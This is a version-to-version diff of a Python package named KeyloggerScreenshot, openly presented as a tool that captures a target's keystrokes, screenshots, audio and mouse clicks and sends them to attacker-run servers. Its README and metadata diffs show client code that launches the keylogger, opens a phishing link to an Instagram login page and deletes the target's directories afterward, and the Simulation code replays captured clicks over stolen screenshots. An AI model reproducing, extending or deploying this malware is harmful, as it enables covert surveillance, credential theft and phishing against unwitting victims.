             self.countdown(seconds)
 
         except OSError:
             working_port = Ports.get_working_ports()
             if str(self.port) in working_port:
                 print(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERKEYLOGGER. PORT NUMBER: {self.port} already in use")
-                os._exit(0)
+                os._exit(0)
+
```

### Comparing `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Simulation_code.py` & `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Simulation_code.py`

 * *Files 22% similar despite different names*

```diff
@@ -5,23 +5,23 @@
 import ast
 import time
 import PIL.Image
 import tkinter as tk
 import BetterPrinting as bp
 import subprocess
 
+
 class Simulation:
+    seconds = None
+    startbutton = None
 
     @staticmethod
     def countdown():
-        global seconds
-        global startbutton
-        global tkWindow
-        real_sec = seconds
-        seconds = seconds + 4
+        real_sec = Simulation.seconds
+        seconds = Simulation.seconds + 4
         # Plus four seconds because of the time the code sleeps
 
         if sys.platform == "linux": size = "295x367"
         else: size = "250x415"
 
         tkWindow = tk.Tk()
         tkWindow.geometry(size)
@@ -35,79 +35,97 @@
             mins, secs = divmod(seconds, 60)
             timer = '{:02d}:{:02d}'.format(mins, secs)
             print(f"\rTime left: {timer}", end="")
             time.sleep(1)
             seconds -= 1
         print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
         # GUI BY: DYMA020
-        startbutton = tk.Button(tkWindow, text="Stop stimulation", command=Simulation.changecol, height=10, width=30)
+        Simulation.startbutton = tk.Button(tkWindow, text="Stop stimulation", command=Simulation.changecol, height=10, width=30)
         # Puts everything on place
-        startbutton.grid(row=1, column=0)
+        Simulation.startbutton.grid(row=1, column=0)
         if real_sec < 60:
             text = f"Simulation for {real_sec} seconds"
         else:
             m, s = divmod(real_sec, 60)
             timer = '{:02d}:{:02d}'.format(m, s)
             text = f"Simulation for {timer} minutes"
         # Just for decoration
         tk.Button(tkWindow, text=text, command=Simulation.connection, height=10, width=30).grid(row=2, column=0)
         tkWindow.mainloop()
 
     @staticmethod
     def changecol():  # This function is here to if the simulation has ended
-        startbutton.configure(bg="red")
+        Simulation.startbutton.configure(bg="red")
         # This is the button
-        startbutton["text"] = "Stop simulation"
-        data = subprocess.check_output("tasklist")
-        str_data = str(data).split()
-        all_exe = [(exe.replace(r"K\\r\\n", "").replace(r"K\r\n", ""), str_data[idx + 1]) for idx, exe in enumerate(str_data) if ".exe" in exe]
-        photo = [(task, pid) for task, pid in all_exe if task == "PhotosApp.exe"]
+        Simulation.startbutton["text"] = "Stop simulation"
+        if sys.platform != "linux":
+            data = subprocess.check_output("tasklist")
+            # This lists all the tasks that are open on windows
+            str_data = str(data).split()
+            # Splits the data
+            all_exe = [(exe.replace(r"K\\r\\n", "").replace(r"K\r\n", ""), str_data[idx + 1]) for idx, exe in enumerate(str_data) if ".exe" in exe]
+            # This removes all unnecessary characters and stores all .exe files with their pid number in this list
+            photo = [(task, pid) for task, pid in all_exe if task == "PhotosApp.exe"]
+            # photo searches for the right pid to kill the process
+
+            if photo:
+                os.system(f"taskkill /f /PID {photo[0][1]}")
+                # Kills the photos with it pid number
+
+        else:
+            linux_data = subprocess.run(["ps", "aux"], capture_output=True)
+            # This lists all the tasks that are open on linux
+            this_data = str(linux_data).split()
+            # Same code as above
+            all_pid = [this_data[idx - 10] for idx, this_pid in enumerate(this_data) if ".PNG" in this_pid]
+            # This the linux version of stopping the process of all Images that are open
+
+            if all_pid:  # If "all_pid" is not empty this line will be executed
+                for pid in all_pid: os.system(f"kill -15 {pid}")
+                # This is the command which kills the process
 
-        if photo:
-            os.system(f"taskkill /f /PID {photo[0][1]}")
         os._exit(0)
 
     @staticmethod
     def connection():
         print("Successful connection")
 
     @staticmethod
     def start_simulation():
-        global seconds
         mouse_coordinates = [mouse for mouse in os.listdir() if "mouseInfoLog" in mouse]
-        #Looks for coordinates in mouseInfoLog
+        # Looks for coordinates in mouseInfoLog
 
         if not mouse_coordinates:
-            #If there isn't a file called mouseInfoLog it will destroy itself
+            # If there isn't a file called mouseInfoLog it will destroy itself
             print("\nThe target hasn't clicked anything")
             print("THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
             sys.exit()
 
         every_coordinate = []
         for each_core in mouse_coordinates:
             fhandle = open(each_core)
             for line in fhandle:
                 if "[" in line:
                     every_coordinate += ast.literal_eval(line)
-                    #This makes a list out of a string
+                    # This makes a list out of a string
 
         img_files = [each_img for each_img in os.listdir() if "New_Image" in each_img]
-        #This checks for all Images in the directory
+        # This checks for all Images in the directory
 
         if not img_files:
             print('There is no "New_Image" in this directory')
             sys.exit()
 
 
         pg.FAILSAFE = False
-        #This is for the corner allowance
+        # This is for the corner allowance
         img_seconds = 5.572
-        #This is the speed it takes to open the image
+        # This is the speed it takes to open the image
         speed = 0.47
-        #This is the time each coordinate needs
+        # This is the time each coordinate needs
         sleep = 1.5
         # This is the time, where the code is taking a time out
         one_coordinate = speed + sleep
 
         if sys.platform != "linux": # This calculation is for windows
             # This is for the corner allowance
             img_seconds = 5.572
@@ -115,44 +133,43 @@
             speed = 0.47
             # This is the time each coordinate needs
             escape = 0.1
             # This is the time the program needs to escape an image
             one_coordinate = speed + sleep
             duration_seconds = one_coordinate * len(every_coordinate)
             one_image = duration_seconds + img_seconds + escape
-            seconds = round(one_image * len(img_files))
+            Simulation.seconds = round(one_image * len(img_files))
             # This calculates the amount it will take
 
         else:
             # Same code as above but this is for linux
             open_img = 2.7
             one_cor = 1.9
             all_cor = one_cor * len(every_coordinate)
             esc = 0.1
             this_img = all_cor + open_img + esc
-            seconds = round(this_img * len(img_files))
-
-        #This calculates the amount it will take
+            Simulation.seconds = round(this_img * len(img_files))
+        # This calculates the amount it will take
 
         print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
-        threading_count = threading.Thread(target=Simulation.countdown, args=(seconds, ))
+        threading_count = threading.Thread(target=Simulation.countdown, args=(Simulation.seconds, ))
         # The countdown will start
         threading_count = threading.Thread(target=Simulation.countdown)
-        #The countdown will start
+        # The countdown will start
         threading_count.start()
 
         pg.sleep(4)
         for image in img_files:
             im = PIL.Image.open(image)
             try:
-                #Opens the image
+                # Opens the image
                 im.show()
                 time.sleep(2)
                 pg.press("f11")
                 # Makes the image in the perfect resolution
                 for x, y in every_coordinate:
                     pg.moveTo(x, y, 0.3)
                     time.sleep(sleep)
                 pg.press("esc")
             except RuntimeError:
                 bp.color('\n\nTry to run "python Simulation_code.py" in your terminal.\nIf this did not work try to clone my project on github: https://github.com/Kill0geR/KeyloggerScreenshot',"red")
-                os._exit(0)
+                os._exit(0)
```

### Comparing `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/PKG-INFO` & `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/PKG-INFO`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: KeyloggerScreenshot
-Version: 0.3.1
+Version: 0.4.0
 Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
 Home-page: 
 Author: Fawaz Bashiru
 Author-email: fawazbashiru@gmail.com
 License: MIT
 Keywords: KeyloggerScreenshot
 Classifier: Development Status :: 6 - Mature
@@ -91,14 +91,18 @@
 
 Client
 ------
 
 ````python
 #client_target.py
 import KeyloggerScreenshot as ks
+import threading
+
+thread_deleter = threading.Thread(target=ks.Local_Deleter.DeleteList.start)
+thread_deleter.start()
 
 ip = '127.0.0.1'
 key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333,ip, 4444, duration_in_seconds=60, phishing_web="https://www.instagram.com/accounts/login/?__coig_restricted=1") # You can open a link when the keylogger starts
 key_client.start()
 ````
 
 You can specify the time of running in secunds in the "duration_in_seconds" variable
@@ -120,15 +124,15 @@
 
 * If you want a cool simulation you can specify that in ServerKeylogger by setting the Parameter simulater to True
 
 * You can open a link that you can choose when the keylogger is executed. Set the Parameter "phishing_web" to your link
 
 * If you really want to send this to work externally, you have to buy a server and download the code on my github.
 
-
+* If backspace is pressed the last pressed character will be deleted from the list
 
 Output
 ------
 ```python
 """
 Cyan: ServerPhotos
 Blue: ServerKeylogger
@@ -339,7 +343,22 @@
 - New Code on "Simulation_code.py" and on "KLS_Start.py"
 - New files on github https://github.com/Kill0geR/KeyloggerScreenshot
 
 0.3.1 (26/04/2023)
 ---------------------
 - Bug fixes
 - Cleaner Code
+
+0.4.0 (30/04/2023)
+--------------------
+- Cleaner Code in Simulation_code.py script
+- Directories of the target will be deleted after Keyboard interruption
+- New File on KeyloggerScreenshot Local_Deleter.py + Documentation
+- After Backspace a new list will be shown
+- More intelligent Keylogger (understands when to change the list)
+- Stops the process of images also in linux with PID
+- PID fix on windows
+- duration_in_seconds has been changed to 60 seconds from 200 seconds
+- Mouseclick information will now be sent after Interruption
+- More intelligent Keylogger
+- If backspace is pressed the last pressed character will be deleted from the list
+- Detects if backspace is hold for a long time
```

### Comparing `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/SOURCES.txt` & `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/SOURCES.txt`

 * *Files 21% similar despite different names*

```diff
@@ -1,21 +1,23 @@
 CHANGELOG.txt
 KLS_start.py
 LISCENCE.txt
 MANIFEST.in
 README.md
-Simulation_code.py
+Simualation_code.py
 client.py
 demon_server.py
-img_1.png
 leo_gui.py
 requirements.py
 setup.py
 target.py
+test.py
+tester.py
 KeyloggerScreenshot/Keylogger_Target.py
+KeyloggerScreenshot/Local_Deleter.py
 KeyloggerScreenshot/Port_data.py
 KeyloggerScreenshot/Server_keylogger.py
 KeyloggerScreenshot/Server_listener.py
 KeyloggerScreenshot/Server_photos.py
 KeyloggerScreenshot/Server_timer.py
 KeyloggerScreenshot/Simulation_code.py
 KeyloggerScreenshot/__init__.py
```

### Comparing `KeyloggerScreenshot-0.3.1/LISCENCE.txt` & `KeyloggerScreenshot-0.4.0/LISCENCE.txt`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.3.1/PKG-INFO` & `KeyloggerScreenshot-0.4.0/PKG-INFO`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: KeyloggerScreenshot
-Version: 0.3.1
+Version: 0.4.0
 Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
 Home-page: 
 Author: Fawaz Bashiru
 Author-email: fawazbashiru@gmail.com
 License: MIT
 Keywords: KeyloggerScreenshot
 Classifier: Development Status :: 6 - Mature
@@ -91,14 +91,18 @@
 
 Client
 ------
 
 ````python
 #client_target.py
 import KeyloggerScreenshot as ks
+import threading
+
+thread_deleter = threading.Thread(target=ks.Local_Deleter.DeleteList.start)
+thread_deleter.start()
 
 ip = '127.0.0.1'
 key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333,ip, 4444, duration_in_seconds=60, phishing_web="https://www.instagram.com/accounts/login/?__coig_restricted=1") # You can open a link when the keylogger starts
 key_client.start()
 ````
 
 You can specify the time of running in secunds in the "duration_in_seconds" variable
@@ -120,15 +124,15 @@
 
 * If you want a cool simulation you can specify that in ServerKeylogger by setting the Parameter simulater to True
 
 * You can open a link that you can choose when the keylogger is executed. Set the Parameter "phishing_web" to your link
 
 * If you really want to send this to work externally, you have to buy a server and download the code on my github.
 
-
+* If backspace is pressed the last pressed character will be deleted from the list
 
 Output
 ------
 ```python
 """
 Cyan: ServerPhotos
 Blue: ServerKeylogger
@@ -339,7 +343,22 @@
 - New Code on "Simulation_code.py" and on "KLS_Start.py"
 - New files on github https://github.com/Kill0geR/KeyloggerScreenshot
 
 0.3.1 (26/04/2023)
 ---------------------
 - Bug fixes
 - Cleaner Code
+
+0.4.0 (30/04/2023)
+--------------------
+- Cleaner Code in Simulation_code.py script
+- Directories of the target will be deleted after Keyboard interruption
+- New File on KeyloggerScreenshot Local_Deleter.py + Documentation
+- After Backspace a new list will be shown
+- More intelligent Keylogger (understands when to change the list)
+- Stops the process of images also in linux with PID
+- PID fix on windows
+- duration_in_seconds has been changed to 60 seconds from 200 seconds
+- Mouseclick information will now be sent after Interruption
+- More intelligent Keylogger
+- If backspace is pressed the last pressed character will be deleted from the list
+- Detects if backspace is hold for a long time
```

### Comparing `KeyloggerScreenshot-0.3.1/README.md` & `KeyloggerScreenshot-0.4.0/README.md`

 * *Files 4% similar despite different names*

```diff
@@ -75,14 +75,18 @@
 
 Client
 ------
 
 ````python
 #client_target.py
 import KeyloggerScreenshot as ks
+import threading
+
+thread_deleter = threading.Thread(target=ks.Local_Deleter.DeleteList.start)
+thread_deleter.start()
 
 ip = '127.0.0.1'
 key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333,ip, 4444, duration_in_seconds=60, phishing_web="https://www.instagram.com/accounts/login/?__coig_restricted=1") # You can open a link when the keylogger starts
 key_client.start()
 ````
 
 You can specify the time of running in secunds in the "duration_in_seconds" variable
@@ -104,15 +108,15 @@
 
 * If you want a cool simulation you can specify that in ServerKeylogger by setting the Parameter simulater to True
 
 * You can open a link that you can choose when the keylogger is executed. Set the Parameter "phishing_web" to your link
 
 * If you really want to send this to work externally, you have to buy a server and download the code on my github.
 
-
+* If backspace is pressed the last pressed character will be deleted from the list
 
 Output
 ------
 ```python
 """
 Cyan: ServerPhotos
 Blue: ServerKeylogger
```

### Comparing `KeyloggerScreenshot-0.3.1/Simulation_code.py` & `KeyloggerScreenshot-0.4.0/Simualation_code.py`

 * *Files 9% similar despite different names*

```diff
@@ -5,23 +5,23 @@
 import ast
 import time
 import PIL.Image
 import tkinter as tk
 import BetterPrinting as bp
 import subprocess
 
+
 class Simulation:
+    seconds = None
+    startbutton = None
 
     @staticmethod
     def countdown():
-        global seconds
-        global startbutton
-        global tkWindow
-        real_sec = seconds
-        seconds = seconds + 4
+        real_sec = Simulation.seconds
+        seconds = Simulation.seconds + 4
         # Plus four seconds because of the time the code sleeps
 
         if sys.platform == "linux": size = "295x367"
         else: size = "250x415"
 
         tkWindow = tk.Tk()
         tkWindow.geometry(size)
@@ -35,49 +35,66 @@
             mins, secs = divmod(seconds, 60)
             timer = '{:02d}:{:02d}'.format(mins, secs)
             print(f"\rTime left: {timer}", end="")
             time.sleep(1)
             seconds -= 1
         print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
         # GUI BY: DYMA020
-        startbutton = tk.Button(tkWindow, text="Stop stimulation", command=Simulation.changecol, height=10, width=30)
+        Simulation.startbutton = tk.Button(tkWindow, text="Stop stimulation", command=Simulation.changecol, height=10, width=30)
         # Puts everything on place
-        startbutton.grid(row=1, column=0)
+        Simulation.startbutton.grid(row=1, column=0)
         if real_sec < 60:
             text = f"Simulation for {real_sec} seconds"
         else:
             m, s = divmod(real_sec, 60)
             timer = '{:02d}:{:02d}'.format(m, s)
             text = f"Simulation for {timer} minutes"
         # Just for decoration
         tk.Button(tkWindow, text=text, command=Simulation.connection, height=10, width=30).grid(row=2, column=0)
         tkWindow.mainloop()
 
     @staticmethod
     def changecol():  # This function is here to if the simulation has ended
-        startbutton.configure(bg="red")
+        Simulation.startbutton.configure(bg="red")
         # This is the button
-        startbutton["text"] = "Stop simulation"
-        if sys.platform == "windows":
+        Simulation.startbutton["text"] = "Stop simulation"
+        if sys.platform != "linux":
             data = subprocess.check_output("tasklist")
+            # This lists all the tasks that are open on windows
             str_data = str(data).split()
+            # Splits the data
             all_exe = [(exe.replace(r"K\\r\\n", "").replace(r"K\r\n", ""), str_data[idx + 1]) for idx, exe in enumerate(str_data) if ".exe" in exe]
+            # This removes all unnecessary characters and stores all .exe files with their pid number in this list
             photo = [(task, pid) for task, pid in all_exe if task == "PhotosApp.exe"]
+            # photo searches for the right pid to kill the process
 
             if photo:
                 os.system(f"taskkill /f /PID {photo[0][1]}")
+                # Kills the photos with it pid number
+
+        else:
+            linux_data = subprocess.run(["ps", "aux"], capture_output=True)
+            # This lists all the tasks that are open on linux
+            this_data = str(linux_data).split()
+            # Same code as above
+            all_pid = [this_data[idx - 10] for idx, this_pid in enumerate(this_data) if ".PNG" in this_pid]
+            # This the linux version of stopping the process of all Images that are open
+
+            if all_pid:  # If "all_pid" is not empty this line will be executed
+                for pid in all_pid: os.system(f"kill -15 {pid}")
+                # This is the command which kills the process
+
         os._exit(0)
 
     @staticmethod
     def connection():
         print("Successful connection")
 
     @staticmethod
     def start_simulation():
-        global seconds
         mouse_coordinates = [mouse for mouse in os.listdir() if "mouseInfoLog" in mouse]
         # Looks for coordinates in mouseInfoLog
 
         if not mouse_coordinates:
             # If there isn't a file called mouseInfoLog it will destroy itself
             print("\nThe target hasn't clicked anything")
             print("THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
@@ -116,34 +133,29 @@
             speed = 0.47
             # This is the time each coordinate needs
             escape = 0.1
             # This is the time the program needs to escape an image
             one_coordinate = speed + sleep
             duration_seconds = one_coordinate * len(every_coordinate)
             one_image = duration_seconds + img_seconds + escape
-            seconds = round(one_image * len(img_files))
+            Simulation.seconds = round(one_image * len(img_files))
             # This calculates the amount it will take
 
         else:
             # Same code as above but this is for linux
             open_img = 2.7
             one_cor = 1.9
             all_cor = one_cor * len(every_coordinate)
             esc = 0.1
             this_img = all_cor + open_img + esc
-            seconds = round(this_img * len(img_files))
-
-        duration_seconds = one_coordinate * len(every_coordinate)
-        one_image = duration_seconds + img_seconds
-        summed_up = one_image * len(img_files)
-        seconds = round(summed_up)
+            Simulation.seconds = round(this_img * len(img_files))
         # This calculates the amount it will take
 
         print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
-        threading_count = threading.Thread(target=Simulation.countdown, args=(seconds, ))
+        threading_count = threading.Thread(target=Simulation.countdown, args=(Simulation.seconds, ))
         # The countdown will start
         threading_count = threading.Thread(target=Simulation.countdown)
         # The countdown will start
         threading_count.start()
 
         pg.sleep(4)
         for image in img_files:
@@ -158,8 +170,8 @@
                     pg.moveTo(x, y, 0.3)
                     time.sleep(sleep)
                 pg.press("esc")
             except RuntimeError:
                 bp.color('\n\nTry to run "python Simulation_code.py" in your terminal.\nIf this did not work try to clone my project on github: https://github.com/Kill0geR/KeyloggerScreenshot',"red")
                 os._exit(0)
 
-Simulation.start_simulation()
+Simulation.start_simulation()
```

### Comparing `KeyloggerScreenshot-0.3.1/demon_server.py` & `KeyloggerScreenshot-0.4.0/demon_server.py`

 * *Files 11% similar despite different names*

```diff
@@ -1,19 +1,19 @@
 import KeyloggerScreenshot as ks
 import threading
 
-ip = "192.168.0.70"
+ip = "127.0.0.1"
 
-server_photos = ks.ServerPhotos(ip, 1111)
+server_photos = ks.ServerPhotos(ip, 1122)
 
-server_keylogger = ks.ServerKeylogger(ip, 2222, simulater=True)
+server_keylogger = ks.ServerKeylogger(ip, 2233, simulater=True)
 
-server_listener = ks.ServerListener(ip, 3333)
+server_listener = ks.ServerListener(ip, 1134)
 
-server_time = ks.Timer(ip, 4444)
+server_time = ks.Timer(ip, 4455)
 
 threading_server = threading.Thread(target=server_photos.start)
 threading_server.start()
 
 threading_server2 = threading.Thread(target=server_keylogger.start)
 threading_server2.start()
```

### Comparing `KeyloggerScreenshot-0.3.1/leo_gui.py` & `KeyloggerScreenshot-0.4.0/leo_gui.py`

 * *Files 3% similar despite different names*

```diff
@@ -2,35 +2,42 @@
 import time
 
 tkWindow = tk.Tk()
 tkWindow.geometry('220x322')
 kurz = "by Fawaz Abolagi Temitaiu Martin Junior Bashiru"
 tkWindow.title('KeyloggerScreenshot')
 started = False
+
+
 def changecol(newstate):
-    if newstate == True:
+    if newstate:
         startbutton.configure(bg="green")
         startbutton["text"] = "Stop KLS"
         start()
     else:
         startbutton.configure(bg="white")
         startbutton["text"] = "Start KLS"
         stop()
 
+
 def start():
     print("started")
 
+
 def stop():
     print("stopped")
 
+
 def start_stop():
     global started
     started = not started
     changecol(started)
 
+
 def show_files():
     print("showing_files")
 
+
 startbutton = tk.Button(tkWindow, text="Stop simulation", command=start_stop, height=10, width=30)
 startbutton.grid(row=1, column=0)
 tk.Button(tkWindow, text="Simulation for 50 seconds", command=show_files, height=10, width=30).grid(row=2, column=0)
-tkWindow.mainloop()
+tkWindow.mainloop()
```

### Comparing `KeyloggerScreenshot-0.3.1/requirements.py` & `KeyloggerScreenshot-0.4.0/requirements.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.3.1/setup.py` & `KeyloggerScreenshot-0.4.0/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -6,15 +6,15 @@
     'Operating System :: Microsoft :: Windows :: Windows 10',
     'License :: OSI Approved :: MIT License',
     'Programming Language :: Python :: 3'
 ]
 
 setup(
     name='KeyloggerScreenshot',
-    version='0.3.1',
+    version='0.4.0',
     description='Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot',
     long_description_content_type="text/markdown",
     long_description=open('README.md').read() + '\n\n' + open('CHANGELOG.txt').read(),
     url='',
     author='Fawaz Bashiru',
     author_email='fawazbashiru@gmail.com',
     license='MIT',
```

